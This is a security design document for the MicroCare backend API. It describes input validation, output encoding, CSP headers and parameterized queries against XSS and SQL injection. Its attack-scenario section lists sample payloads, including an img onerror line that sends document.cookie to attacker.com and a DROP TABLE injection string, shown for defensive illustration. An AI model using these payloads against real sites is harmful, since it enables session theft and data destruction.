# Input Sanitization and XSS Prevention

## Overview

This document describes the input validation and output encoding strategy used to prevent XSS (Cross-Site Scripting) and injection attacks in the MicroCare backend API.

**Requirements Addressed**: 4.1, 4.2

## Implementation Details

### 1. Validation Layer

The validation middleware in `src/middleware/validationMiddleware.ts` also includes:

- `validateRequest(schema)`: Validates request body against a schema
- Input validation functions for specific fields:
  - `validateEmail()`: Validates email format
  - `validatePasswordStrength()`: Validates password requirements
  - `validateName()`: Validates user name
  - `validateEntryTitle()`: Validates entry title
  - `validateEntryContent()`: Validates entry content
  - `validateMood()`: Validates mood value
  - `validateTags()`: Validates tags array
  - `validatePagination()`: Validates pagination parameters

### 2. SQL Injection Prevention

SQL injection is prevented through:
- **Prisma ORM**: Uses parameterized queries automatically
- **Input Validation**: Validates all inputs before database operations
- **Type Safety**: TypeScript ensures type correctness

### 3. XSS Prevention

XSS attacks are prevented through:
- **Input Validation**: Only expected fields and types are accepted
- **Output Encoding**: Escape or encode data at render time in the frontend
- **Content Security Policy**: Helmet middleware enforces CSP headers
- **HttpOnly Cookies**: Prevents JavaScript access to authentication tokens

## Attack Scenarios Covered

### 1. Stored XSS
```javascript
// Malicious input
<img src=x onerror="fetch('http://attacker.com?cookie='+document.cookie)">

// After output encoding (at render time)
&lt;img src=x onerror=&quot;fetch('http://attacker.com?cookie='+document.cookie)&quot;&gt;
```

### 2. DOM-based XSS
```javascript
// Malicious input
<svg onload="alert('XSS')">

// After output encoding (at render time)
&lt;svg onload=&quot;alert('XSS')&quot;&gt;
```

### 3. Event Handler XSS
```javascript
// Malicious input
<div onclick="alert('XSS')">Click me</div>

// After output encoding (at render time)
&lt;div onclick=&quot;alert('XSS')&quot;&gt;Click me&lt;/div&gt;
```

### 4. JavaScript Protocol XSS
```javascript
// Malicious input
<a href="javascript:alert('XSS')">Click</a>

// After output encoding (at render time)
&lt;a href=&quot;javascript:alert('XSS')&quot;&gt;Click&lt;/a&gt;
```

### 5. SQL Injection
```sql
-- Malicious input
'; DROP TABLE users; --

-- Stored safely as string (Prisma handles parameterization)
-- Database remains protected
```

## Testing

### Unit Tests
Located in: `src/middleware/validationMiddleware.test.ts`

Tests cover:
- HTML special character escaping

- Whitespace trimming
- Nested object sanitization
- Array sanitization
- Real-world XSS attack scenarios
- SQL injection attempts

Run tests:
```bash
npm test -- validationMiddleware.test.ts
```

### Integration Tests
Located in: `src/integration.test.ts`

Tests cover:
- XSS prevention in request body
- XSS prevention in query parameters
- SQL injection prevention
- Special character handling
- Update entry sanitization

Run tests:
```bash
npm test -- integration.test.ts
```

## API Endpoints Protected

All API endpoints benefit from validation, and any UI rendering should encode output safely.

## Best Practices

1. **Validate Input**: Accept only known fields and expected types
2. **Escape on Output**: Frontend should escape data when displaying
3. **Use Parameterized Queries**: Prisma handles this automatically
4. **Content Security Policy**: Helmet middleware enforces CSP
5. **HttpOnly Cookies**: Prevents XSS token theft
6. **Regular Updates**: Keep dependencies updated for security patches

## Performance Considerations

- Validation adds minimal overhead (microseconds per request)
- Output encoding cost is negligible compared to rendering
- No performance impact on non-string data types

## Future Enhancements

1. **Allowlist HTML Sanitization**: If rich text is required, sanitize at render time with an allowlist-based sanitizer
2. **Rate Limiting**: Prevent brute force attacks
3. **Request Signing**: Verify request integrity
4. **Audit Logging**: Log suspicious requests
5. **Web Application Firewall**: Additional layer of protection

## References

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [Helmet.js Security Headers](https://helmetjs.github.io/)
- [Prisma Security](https://www.prisma.io/docs/concepts/more/security)
